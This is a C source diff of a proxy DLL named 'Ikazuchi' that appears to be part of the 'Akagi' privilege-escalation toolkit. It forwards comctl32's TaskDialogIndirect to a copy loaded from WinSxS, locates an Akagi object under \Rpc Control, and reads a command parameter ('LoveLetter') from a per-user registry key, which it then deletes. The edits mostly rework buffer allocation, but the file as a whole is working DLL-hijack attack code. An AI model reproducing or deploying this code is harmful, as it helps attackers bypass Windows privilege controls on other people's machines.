@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016
+*  (C) COPYRIGHT AUTHORS, 2016 - 2017
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.50
+*  VERSION:     2.57
 *
-*  DATE:        07 July 2016
+*  DATE:        07 Mar 2017
 *
 *  Proxy dll entry point, Ikazuchi.
 *
@@ -29,10 +29,10 @@
 #pragma warning(disable: 6102) // Using %s from failed function call at line %u
 
 #include <windows.h>
-#include "..\Shared\ntos.h"
+#include "shared\ntos.h"
 #include <ntstatus.h>
-#include "..\shared\minirtl.h"
-#include "..\Shared\_filename.h"
+#include "shared\minirtl.h"
+#include "shared\_filename.h"
 
 #if (_MSC_VER >= 1900) 
 #ifdef _DEBUG
@@ -43,16 +43,27 @@
 #endif
 #endif
 
-#define T_AKAGI_KEY    L"Software\\Akagi"
-#define T_AKAGI_PARAM  L"LoveLetter"
-#define COMCTL32_SXS   L"microsoft.windows.common-controls"
-#define COMCTL32_DLL   L"comctl32.dll"
+#define T_SXS_DIRECTORY         L"\\\\?\\globalroot\\systemroot\\winsxs\\"
+#define SXS_DIRECTORY_LENGTH    sizeof(T_SXS_DIRECTORY) - sizeof(WCHAR)
+
+#define T_REGISTRY_USER         L"\\REGISTRY\\USER\\"
+#define REGISTRY_USER_LENGTH    sizeof(T_REGISTRY_USER) - sizeof(WCHAR)
+
+#define T_AKAGI_KEY             L"Software\\Akagi"
+#define AKAGI_KEY_LENGTH        sizeof(T_AKAGI_KEY) - sizeof(WCHAR)
+
+#define T_COMCTL32_SLASH        L"\\comctl32.dll"
+#define COMCTL32_SLASH_LENGTH   sizeof(T_COMCTL32_SLASH) - sizeof(WCHAR)
+
+#define T_AKAGI_PARAM           L"LoveLetter"
+#define COMCTL32_SXS            L"microsoft.windows.common-controls"
+#define COMCTL32_DLL            L"comctl32.dll"
 
 typedef NTSTATUS(NTAPI *PENUMOBJECTSCALLBACK)(POBJECT_DIRECTORY_INFORMATION Entry, PVOID CallbackParam);
 
 typedef struct _OBJSCANPARAM {
     PWSTR Buffer;
-    ULONG BufferSize;
+    SIZE_T BufferSize;
 } OBJSCANPARAM, *POBJSCANPARAM;
 
 typedef struct _SXS_SEARCH_CONTEXT {
@@ -179,6 +190,7 @@ NTSTATUS NTAPI supDetectObjectCallback(
     _In_ PVOID CallbackParam
 )
 {
+    SIZE_T BufferSize;
     POBJSCANPARAM Param = (POBJSCANPARAM)CallbackParam;
 
     if (Entry == NULL) {
@@ -189,16 +201,17 @@ NTSTATUS NTAPI supDetectObjectCallback(
         return STATUS_INVALID_PARAMETER_2;
     }
 
-    if (Param->Buffer == NULL || Param->BufferSize == 0) {
-        return STATUS_MEMORY_NOT_ALLOCATED;
-    }
-
     if (Entry->Name.Buffer) {
-        _strncpy(
-            Param->Buffer, Param->BufferSize / sizeof(WCHAR), 
-            Entry->Name.Buffer, Param->BufferSize / sizeof(WCHAR)
-        );
-        return STATUS_SUCCESS;
+        BufferSize = Entry->Name.Length + sizeof(UNICODE_NULL);
+        Param->Buffer = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, BufferSize);
+        if (Param->Buffer) {
+            Param->BufferSize = BufferSize;
+            _strncpy(
+                Param->Buffer, Param->BufferSize / sizeof(WCHAR),
+                Entry->Name.Buffer, Entry->Name.Length / sizeof(WCHAR)
+            );
+            return STATUS_SUCCESS;
+        }
     }
     return STATUS_UNSUCCESSFUL;
 }
@@ -327,15 +340,18 @@ HRESULT WINAPI TaskDialogIndirectForward(
         if (lpszDirectoryName == NULL)
             break;
 
-        sz = 0x1000 + (_strlen(lpszDirectoryName) * sizeof(WCHAR));
+        sz = SXS_DIRECTORY_LENGTH + COMCTL32_SLASH_LENGTH + ((1 + _strlen(lpszDirectoryName)) * sizeof(WCHAR));
         NtAllocateVirtualMemory(NtCurrentProcess(), &lpSxsPath, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (lpSxsPath == NULL)
             break;
 
-        _strcpy(lpSxsPath, L"\\\\?\\globalroot\\systemroot\\winsxs\\");
+        _strcpy(lpSxsPath, T_SXS_DIRECTORY);
         _strcat(lpSxsPath, lpszDirectoryName);
-        _strcat(lpSxsPath, L"\\comctl32.dll");
+        _strcat(lpSxsPath, T_COMCTL32_SLASH);
 
+        DllName.Buffer = NULL;
+        DllName.Length = 0;
+        DllName.MaximumLength = 0;
         RtlInitUnicodeString(&DllName, lpSxsPath);
         if (NT_SUCCESS(LdrLoadDll(NULL, NULL, &DllName, &hLib))) {
             if (hLib) {
@@ -389,39 +405,34 @@ BOOL ucmQueryCustomParameter(
     STARTUPINFOW                    startupInfo;
     PROCESS_INFORMATION             processInfo;
     ULONG                           bytesIO = 0L;
-
-    WCHAR                           szBuffer[MAX_PATH * 2];
     OBJSCANPARAM                    Param;
 
     do {
 
-        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-        Param.Buffer = szBuffer;
-        Param.BufferSize = sizeof(szBuffer);
+        Param.Buffer = NULL;
+        Param.BufferSize = 0;
 
         status = supEnumSystemObjects(L"\\Rpc Control\\Akagi", NULL,
             supDetectObjectCallback, &Param);
         if (!NT_SUCCESS(status))
             break;
 
-        RtlSecureZeroMemory(&usKey, sizeof(usKey));
-        RtlInitUnicodeString(&usKey, szBuffer);
+        if ((Param.Buffer == NULL) || (Param.BufferSize == 0))
+            break;
 
-        memIO = 0x1000 + (_strlen(szBuffer) * sizeof(WCHAR));
-
+        memIO = MAX_PATH + Param.BufferSize + REGISTRY_USER_LENGTH + AKAGI_KEY_LENGTH;
         lpszParamKey = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, memIO);
         if (lpszParamKey == NULL)
             break;
 
-        _strcpy_w(lpszParamKey, L"\\REGISTRY\\USER\\");
-        _strcat_w(lpszParamKey, usKey.Buffer);
+        _strcpy_w(lpszParamKey, T_REGISTRY_USER);
+        _strcat_w(lpszParamKey, Param.Buffer);
         _strcat_w(lpszParamKey, L"\\");
         _strcat_w(lpszParamKey, T_AKAGI_KEY);
 
         RtlSecureZeroMemory(&usKey, sizeof(usKey));
         RtlInitUnicodeString(&usKey, lpszParamKey);
         InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
         status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
         if (!NT_SUCCESS(status)) {
             break;
@@ -472,6 +483,9 @@ BOOL ucmQueryCustomParameter(
     if (hKey != NULL) {
         NtDeleteKey(hKey);
         NtClose(hKey);
+    }
+    if (Param.Buffer != NULL) {
+        RtlFreeHeap(ProcessHeap, 0, Param.Buffer);
     }
     if (lpszParamKey != NULL) {
         RtlFreeHeap(ProcessHeap, 0, lpszParamKey);
